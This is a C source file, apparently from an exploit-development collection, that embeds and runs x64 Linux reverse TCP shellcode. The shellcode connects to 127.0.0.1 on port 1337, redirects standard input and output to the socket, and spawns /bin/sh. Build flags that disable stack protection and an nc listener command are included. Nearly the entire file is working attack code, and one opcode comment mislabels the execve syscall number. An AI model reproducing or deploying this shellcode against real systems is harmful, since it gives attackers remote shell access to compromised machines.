//x64 Linux reverse TCP connect shellcode

/*
* Author:           FXC
* Build/Run:        gcc -masm=intel -z execstack -fno-stack-protector reverse_shell_x64_shellcode.c -o reverse_shell_x64_shellcode
*                   nc -lvnp 1337
*/

int main(void)
{
	char shellcode[] = 
	"\x6a\x02" 	// push 2
	"\x5f"		// pop rdi
	"\x6a\x01"	// push 1
	"\x5e"		// pop rsi
	"\x48\x31\xd2"	// xor rdx, rdx
	"\x6a\x29"	// push 0x29
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x50"		// push rax
	"\x5f"		// pop rdi
	"\x48\xba\x02\x00\x05\x39\x7f\x00\x00\x01"	// mov rdx, 0x0100007f39050002
	"\x52"		// push rdx
	"\x52"		// push rdx
	"\x48\x89\xe6"	// mov rsi, rsp
	"\x48\xc7\xc2\x10\x00\x00\x00" // mov rdx, 0x10
	"\x6a\x2a"	// push 0x2a
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x48\x31\xf6"	// xor rsi, rsi
	"\x6a\x21"	// push 0x21
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x6a\x01"	// push 1
	"\x5e"		// pop rsi
	"\x6a\x21"	// push 0x21
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x6a\x02"	// push 2
	"\x5e"		// pop rsi
	"\x6a\x21"	// push 0x21
	"\x58"		// pop rax
	"\x0f\x05"	// syscall
	"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00"	// mov rax, 0x68732f6e69622f
	"\x50"		// push rax
	"\x48\x89\xe7"	// mov rdi, rsp
	"\x48\x31\xf6"	// xor rsi, rsi
	"\x48\x31\xd2"	// xor rdx, rdx
	"\x6a\x3b"	// push 0x21
	"\x58"		// pop rax
	"\x0f\x05";	// syscall
	
	__asm__(
	"mov rax, 0xffffffffffffffff;"
	"mov rdi, rax;"
	"mov rsi, rax;"
	"mov rdx, rax;"
	"mov rcx, rax;"
	"mov r8, rax;"
	"mov r9, rax;"
	"mov rbx, rax;"
	);
	
	((void(*)(void))shellcode)();
}

